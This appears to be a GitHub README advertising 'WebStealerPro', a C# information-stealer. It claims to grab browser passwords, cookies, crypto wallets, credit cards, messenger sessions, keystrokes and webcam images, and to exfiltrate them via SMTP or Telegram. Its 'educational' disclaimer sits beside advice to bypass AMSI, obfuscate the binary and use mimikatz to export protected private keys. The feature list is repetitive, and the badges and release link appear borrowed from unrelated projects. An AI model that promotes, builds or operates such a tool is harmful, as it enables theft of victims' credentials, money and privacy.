<div align="center">

# WebStealerPro | Password Cookies Exodus Metamask ALLBrowsers Stealer
![GitHub release](https://img.shields.io/github/release/ppy/osu.svg)
![CodeFactor](https://www.codefactor.io/repository/github/ppy/osu/badge)
![dev chat](https://discordapp.com/api/guilds/188630481301012481/widget.png?style=shield)
![Crowdin](https://d322cqt584bo4o.cloudfront.net/osu-web/localized.svg)
![Renovate enabled](https://img.shields.io/badge/renovate-enabled-brightgreen.svg)
![license](https://img.shields.io/github/license/mashape/apistatus.svg)
![Chat](https://badges.gitter.im/awesome-twitter-bots/Lobby.svg)


# Understanding the Purpose and Functionality

- **This is a Proof of Concept (P.O.C) tool centered around bitcoin theft, intended exclusively for educational exploration and developed using C# programming language. Its primary goal is to highlight the potential vulnerabilities in the bitcoin wallet system. The tool operates by identifying the user's bitcoin wallet and substituting it with a malicious bitcoin wallet address. It is designed with simplicity in mind, making it suitable for learning purposes, and welcomes engagement from all levels of users.**

- **This tool is classified as potentially malicious by Windows Defender. It is important to exercise extreme caution when interacting with it. Do not execute it directly from a storage device on a target system. If you intend to run it in-memory on a target system, ensure that it is done with AMSI (Antimalware Scan Interface) bypassed. Employ obfuscation techniques, such as using tools like ConfuserEx, to add an additional layer of protection.**

- **When exporting a certificate with an associated private key in the Personal Information Exchange (PFX) format, it's crucial to note that the default password is left blank. This is not the same as being nonexistent. Optionally, you have the option to define a password using the `--password` argument.**

- **In scenarios where keys are marked as not exportable, modifying the CryptoAPI (CAPI) to allow the export of non-exportable keys within the current process might be necessary. Tools like mimikatz can assist in achieving this via the `crypto::capi` command. For cases involving exporting non-exportable device certificates, mimikatz can also modify the memory of the running lsass.exe process to bypass protective measures using the `crypto::cng` command.**

- **Alternatively, another method for extracting private keys is through Data Protection Application Programming Interface (DPAPI) operations. This involves utilizing the user's DPAPI master key, or other potential methods such as a password, domain DPAPI private key, or system backup key, to decrypt the user's master key and subsequently decrypt their certificates stored in the registry. This approach can be executed using tools like SharpDPAPI or mimikatz. Additional insights into this process can be found in the THEFT2 and THEFT3 sections of SpecterOps's whitepaper titled "Certified Pre-Owned," which covers this topic comprehensively. Reading the entire paper is highly recommended for a deeper understanding of the subject matter.**


# Following Guidelines

- [x] <b>Exclusively for Educational Purposes
- [x] Prohibition of Resale
- [ ] Permissible Use of Source Code while Maintaining Credits (both embedded and in reductions); Obligatory Open-Source Nature
- [x] Disclaimer: We bear no liability for any actions conducted with our software, particularly if they breach legal boundaries<b>

# Comprehensive Array of Capabilities

🚀 **Welcome to our feature-rich toolkit designed to enhance your tasks! Here's an overview of what we offer:**

## **Data Extraction and Privacy Analysis**

- <b>🔑 QR Code Logger: Seamlessly capture QR codes for data input.
- 🔒 Discord Login Extraction: Retrieve user login details for Discord.
- 🆔 Username Acquisition: Easily gather usernames from various sources.
- 📜 Identification Number (ID): Obtain and manage identification numbers.
- 🌐 Token Extraction: Effortlessly extract tokens for various platforms.<b>

## **Advanced Security Mechanism Handling**

- <b>🛡️ Overcoming Novel Security Mechanisms: Stay ahead by bypassing new security features.
- 🔐 Circumvention of Two-Step Verification: Gain access even when two-step verification is in place.
- 🚧 Overcoming Identity Hurdles: Navigate through inherent identity challenges and 5-digit verification codes.<b>

## **Communication and Integration**

- <b>📧 SMTP Transport Support: Seamless integration with SMTP transport for efficient communication.
- 📞 Telegram API Transport Support (with Proxy): Connect through Telegram API with added privacy.
- 💬 Fake Message Integration: Integrate fake messages for specific scenarios.
- 🖼️ Customizable Icons Support: Personalize icons to suit your preferences.<b>

## **Cutting-edge Features**

- <b>🌟 A.V Bypass (Upcoming Feature): Upcoming feature to bypass antivirus detection.
- 🔍 Detection of Inspect Element Usage: Identify unauthorized inspect element usage.
- 🎨 Personalized Design: Tailor the design to your liking with aesthetic visuals.
- 🔒 Anti-Analysis Measures: Stay under the radar with measures against analysis tools.<b>
  
## **System Insights and Data Gathering**

- <b>💻 System Information Retrieval: Gather system details like version, CPU, GPU, RAM, IPs, and more.
- 🌐 Browser Data Extraction: Extract valuable data from Chromium, Firefox, and Internet Explorer/Edge.
- 📶 Network Enumeration: Enumerate saved and nearby WiFi networks for insights.
- 📂 File Acquisition: Acquire a wide range of files, from documents to databases.<b>
  
## **Online Services Integration**

- <b>💳 Detection of Banking and Cryptocurrency Services: Identify financial platforms within browsers.
- 🎮 Session Retrieval for Gaming Platforms: Retrieve sessions for Steam, Uplay, Battle.Net, Minecraft.
- ⌨️ Keylogger and Clipboard Manipulator: Deploy keyloggers and manipulate clipboard content.
- 📸 Screenshots and Webcam Capture: Capture desktop and webcam screenshots discreetly.<b>
  
## **Enhanced Security and Privacy Support**

- <b>🔐 VPN Compatibility: Use with ProtonVPN, OpenVPN, NordVPN for enhanced privacy.
- 💰 Crypto Wallet Support: Compatible with various crypto wallets and their extensions.
- 📱 Messenger Capture: Capture sessions, accounts, tokens for Discord, Telegram, ICQ, Skype, and more.
- 🕵️‍♀️ Phishing Detection Measures: Implement measures to detect phishing for platforms like Metamask.<b>

## **User-friendly Interface and Functionality**

- <b>📁 Display of File Directory Structure: Easily navigate through file directories.
- 🖥️ Compilation of FileZilla Hosts: Compile a list of FileZilla hosts for efficient access.
- 🔄 Compilation of Running Processes: Get a comprehensive list of running processes.
- 🔑 Retrieval of Product Key: Easily retrieve product keys for software.<b>
  
## **Efficient Automation and Customization**

- <b>🤖 Authoritative Module for Automatic Execution: Execute tasks authoritatively with automation.
- ⏩ Swift Transactions: Perform tasks quickly and efficiently.
- ⚙️ Contract-Free Usage: Enjoy the toolkit's capabilities without binding contracts.<b>
  
## **Seamless Data Retrieval and Integration**

- <b>🌐 Browser Integration: Extract passwords, emails, and more from browsers.
- 💳 Payment Information Capture: Capture credit card details, CVC, expiry dates, billing info.
- 🌐 IP and Hostname Extraction: Retrieve IP addresses and computer hostnames.
- 🚪 Instant Logoff Capability: Log off instantly for added security.
- 🔒 Quick QR Code Deactivation: Deactivate QR codes swiftly when needed.<b>

## **Customized User Experience**

- <b>🎨 Tailored Embedding: Embed the toolkit seamlessly into your workflow.
- 🧩 Ingenious Code Structure: Benefit from a well-structured and efficient codebase.
- 🍪 Cookie Information Retrieval: Retrieve valuable cookie information.
- 🔐 Automatic Cookie Logging: Log cookies automatically for analysis.
- 🌌 Metamask and Exodus Support: Retrieve information from Metamask and Exodus wallets.<b>

## **Advanced Security Measures**

- <b>🚫 Anti-Delete and Anti-Spam Measures: Prevent unauthorized deletion and spamming.
- ⚡ Evasion of Detections: Remain undetected with a 0/64 detection rate.<b>

## **Tailored for Windows**

- <b>🪟 Compatibility with Official Telegram Desktop: Compatible with Windows Telegram Desktop.<b>
  
## **Secure Information Retrieval**

- <b>🔐 Password Extraction: Effortlessly extract passwords, including modifications.
- 📧 Email Extraction: Retrieve email addresses for various purposes.
- 📛 Badge Retrieval: Capture badges for user identification.
- 💎 Nitro Capture: Capture Nitro for premium features.<b>

## **Sensitive Data Capture**

- <b>💳 Credit Card Information: Capture credit card numbers, CVC, expiry dates, billing info.
- 🌐 IP Address Extraction: Extract IP addresses for analysis.
- 🖥️ Webcam Screenshots: Capture webcam screenshots discreetly.<b>

## **Efficient Control and Features**

- <b>✨ Instant Logoff and QR Code Deactivation: Swiftly log off and deactivate QR codes for security.
- 🚀 Mastery of Identity Verification: Expertly handle inherent identity and 5-digit verification codes.<b>
  
## **Reliable Integrations**

- <b>📩 Integration with SMTP Transport: Seamlessly connect with SMTP for reliable communication.
- 📲 Integration with Telegram API Transport: Connect via Telegram API with added flexibility.<b>
  
## **Enhanced Communication**

- <b>💬 Facilitation of Fake Messages: Easily create and integrate fake messages.
- 🎭 Custom Icon Integration: Personalize icons to enhance user experience.<b>

## **Cutting-edge Security Measures**

- <b>🔐 Phishing Detection Measures for Metamask: Implement measures to detect phishing attempts.
- 🕵️‍♂️ Evasion of Detections: Stay undetected with advanced evasion techniques.<b>
  
## **Experience Unmatched Capabilities**

- <b>🚀 Contract-Free Usage: Enjoy all features without restrictive contracts.
- 💼 Comprehensive Data Retrieval: Gather data from various sources effectively.<b>



# Prerequisites for Building

**In order to compile the software from its source code, the following prerequisites need to be in place:**

- [Visual Studio 2022 (v17.*)](https://visualstudio.microsoft.com/vs/)
- [NET SDK 6.0.*](https://dotnet.microsoft.com/en-us/download/dotnet/6.0) (Included with Visual Studio 2022)
- [NET Framework SDK 4.8](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net48) (Included with Visual Studio 2022)

**These components are essential for the successful building of the software using its source code.**


# Runtime Prerequisites

**These components are solely necessary if you decide to download the release version from the [Releases](https://github.com/Stealerium/Stealerium/releases) section (stealerium.zip):**

- Builder.exe (Requires [NET Runtime 6.0.*](https://dotnet.microsoft.com/en-us/download/dotnet/6.0))
- Stub (Requires [NET Framework 4.8](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net48))

**These runtime requirements are crucial if you opt for the downloadable release version of the software.**

</div>